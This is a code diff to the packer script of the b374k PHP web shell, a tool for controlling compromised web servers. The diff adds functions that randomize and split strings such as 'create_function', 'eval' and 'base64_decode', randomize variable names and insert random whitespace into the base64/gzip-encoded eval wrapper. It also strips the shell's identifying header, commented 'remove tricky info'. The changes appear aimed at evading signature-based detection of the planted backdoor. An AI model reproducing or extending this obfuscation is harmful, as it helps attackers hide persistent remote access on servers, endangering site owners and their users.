@@ -101,7 +101,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
+
 		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
@@ -112,7 +112,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
 	}
 	else{
-	
+
 	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
 	foreach($GLOBALS['packer']['theme'] as $k){
 		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
@@ -120,12 +120,13 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	}
 	$available_themes .= "</select></td></tr>";
 
-	?><!doctype html>
+	?>
+	<!doctype html>
 	<html>
 	<head>
 	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
 	<meta charset='utf-8'>
-	<meta name='robots' content='noindex, nofollow, noarchive'>
+	<meta name='robots' content='noindex,nofollow,noarchive'>
 	<style type="text/css">
 	<?php echo $css_code;?>
 	#devTitle{
@@ -236,7 +237,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			});
 
 		});
-		
+
 		$('.theme').on('change', function(e){
 			$('.theme').val($(this).val());
 			set_cookie('packer_theme', $('.theme').val());
@@ -257,7 +258,8 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 
 	</script>
 	</body>
-	</html><?php
+	</html>
+	<?php
 	}
 }
 else{
@@ -270,6 +272,7 @@ else{
 		$output .= "\t-t theme\t\t\t\ttheme to use\n";
 		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
 		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
+		$output .= "\t-r [0-9]\t\t\t\tnumber of space for randomization\n";
 		$output .= "\t-b\t\t\t\t\tencode with base64\n";
 		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
@@ -278,14 +281,14 @@ else{
 
 	}
 	else{
-		$opt = getopt("o:p:t:m:sbz:c:lk");
+		$opt = getopt("o:p:t:m:r:sbz:c:lk");
 
 		if(isset($opt['l'])){
 			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
 			echo $output;
 			die();
 		}
-		
+
 		if(isset($opt['k'])){
 			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
 			echo $output;
@@ -309,12 +312,19 @@ else{
 			die();
 		}
 		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
-		
+
 		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
 		if(empty($modules)) $modules = array();
 		else $modules = explode("," ,$modules);
 
 		$strip = isset($opt['s'])? "yes":"no";
+		$space = isset($opt['r'])? trim($opt['r']):"";
+		if(empty($space)) $space = '0';
+		if(!preg_match("/^[0-9]{1}$/", $space)){
+			$output .= "error : unknown options -r ".$space." (use only 0-9)\n\n";
+			echo $output;
+			die();
+		}
 		$base64 = isset($opt['b'])? "yes":"no";
 
 		$compress = isset($opt['z'])? trim($opt['z']):"no";
@@ -345,6 +355,7 @@ else{
 		$output .= "Theme\t\t\t: ".$theme."\n";
 		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
 		$output .= "Strip\t\t\t: ".$strip."\n";
+		$output .= "Space\t\t\t: ".$space."\n";
 		$output .= "Base64\t\t\t: ".$base64."\n";
 		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
 		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";
@@ -362,14 +373,14 @@ else{
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
+
 		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
 		$htmlcode = trim($layout);
 		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
+		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $space, $compress, $compress_level, $password);
 		$status = explode("{[|b374k|]}", $res);
 		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
 	}
@@ -391,7 +402,7 @@ function packer_write_file($file, $content){
 	if($fh = @fopen($file, "wb")){
 		if(fwrite($fh, $content)!==false){
 			if(!class_exists("ZipArchive")) return true;
-			
+
 			if(file_exists($file.".zip")) unlink ($file.".zip");
 			$zip = new ZipArchive();
 			$filename = "./".$file.".zip";
@@ -497,13 +508,83 @@ function packer_pack_js($str){
 	return $packer->pack();
 }
 
-function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
+/**
+ * randomization of string
+ *
+ * @author hex7c0 <hex7c0@gmail.com>
+ * @param {String} $str - input string
+ * @param {Integer} $space - number of space
+ * @return {String}
+ */
+function rand_string($str,$space){
+	$len = strlen($str);
+	$index = mt_rand(1,3);
+	$output = substr($str,0,$index);
+	for ($i = $index; $i < $len; $i+=$index) {
+		$index = mt_rand(1,3);
+		$output .= "'.";
+		$output .= rand_space($space)."'";
+		$output .= substr($str,$i,$index);
+	}
+	return $output;
+}
+
+/**
+ * randomization of function
+ *
+ * @author hex7c0 <hex7c0@gmail.com>
+ * @param {String} $var - function var
+ * @param {Integer} $space - number of space
+ * @return {String}
+ */
+function rand_fx($var,$space){
+	$str = "reate_function";
+	$len = strlen($str);
+	$output = $var."=\"c";
+	for ($i = 0; $i < $len; $i+=$index) {
+		$index = mt_rand(1,3);
+		$output .= "\".";
+		$output .= rand_space($space)."\"";
+		$output .= substr($str,$i,$index);
+	}
+	return $output."\";";
+}
+
+/**
+ * generate random space
+ *
+ * @author hex7c0 <hex7c0@gmail.com>
+ * @param {Integer} $space - number of space
+ * @return {String}
+ */
+function rand_space($space){
+	return str_repeat(' ',mt_rand(0,$space));
+}
+
+/**
+ * generate  $ + random char
+ *
+ * @author hex7c0 <hex7c0@gmail.com>
+ * @param {String} [$opt] - avoid use of this char
+ * @return {String}
+ */
+function rand_char($opt){
+	$az = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	$index = mt_rand(0,strlen($az)-1);
+	$try = "\$_".$az[$index];
+	if($opt && $opt==$try){
+		return rand_char($opt);
+	}
+	return $try;
+}
+
+function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $space, $compress, $compress_level, $password){
 	$content = "";
 	if(is_file($output)){
 		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['pass'] = \"".sha1(md5($password))."\"; // sha1(md5(pass))\n";
+	if(!empty($password)) $password = "\$GLOBALS['pass']".rand_space($space)."=\"".sha1(md5($password))."\";";
 
 	$compress_level = (int) $compress_level;
 	if($compress_level<0) $compress_level = 0;
@@ -513,16 +594,15 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
 		$version = $r[1];
 	}
-	
-	$header = "<?php
-/*
-	b374k shell ".$version."
-	Jayalah Indonesiaku
-	(c)".@date("Y",time())."
-	https://github.com/b374k/b374k
 
-*/\n";
-
+	$header = "<?php ";
+//remove tricky info
+// /*
+// 	b374k shell ".$version."
+// 	Jayalah Indonesiaku
+// 	(c)".@date("Y",time())."
+// 	https://github.com/b374k/b374k
+// */\n";
 
 	if($strip=='yes'){
 		$phpcode = packer_strips($phpcode);
@@ -534,42 +614,55 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
 	}
 
-
 	$content = $phpcode.$htmlcode;
 
 	if($compress=='gzdeflate'){
 		$content = gzdeflate($content, $compress_level);
-		$encoder_func = "gz'.'in'.'fla'.'te";
+		$encoder_func = 'gzinflate';
 	}
 	elseif($compress=='gzencode'){
 		$content = gzencode($content, $compress_level);
-		$encoder_func = "gz'.'de'.'co'.'de";
+		$encoder_func = 'gzdecode';
 	}
 	elseif($compress=='gzcompress'){
 		$content = gzcompress($content, $compress_level);
-		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
+		$encoder_func = 'gzuncompress';
 	}
 	else{
-		$encoder_func = "";
+		$encoder_func = '';
 	}
+
+	//var
+	$b374k_x=rand_char(0);
+	$b374k_f=rand_char(0).'X';
+	$b374k_k=rand_char($b374k_x);
 
 	if($base64=='yes'){
 		$content = base64_encode($content);
 		if($compress!='no'){
-			$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+			$encoder = rand_string($encoder_func."(base64_decode(",$space).$b374k_x."))";
+			/* $encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))"; */
 		}
 		else{
-			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
+			$encoder = rand_string("base64_decode(",$space).$b374k_x.")";
+			/* $encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")"; */
 		}
 
-		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>";
+		/* "\$_fx=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";" */
+		$code = $header.rand_space($space).rand_fx($b374k_f,$space);
+		$code .= rand_space($space).$password.rand_space($space);
+		$code .= $b374k_k."=".$b374k_f."('".$b374k_x."','";
+		$code .= rand_string("eval(",$space)."\"?>\".".$encoder.");');".rand_space($space);
+		$code .= $b374k_k."('".$content."');".rand_space($space)."?>";
+		/* $code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>"; */
+
 	}
 	else{
 		if($compress!='no'){
-			$encoder = $encoder_func."(\$x)";
+			$encoder = rand_string($encoder_func,$space)."(\$x)";
 		}
 		else{
-			$code = $header.$password."?>".$content;
+			$code = $header.rand_space($space).$password."?>".$content;
 			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
 		}
 	}
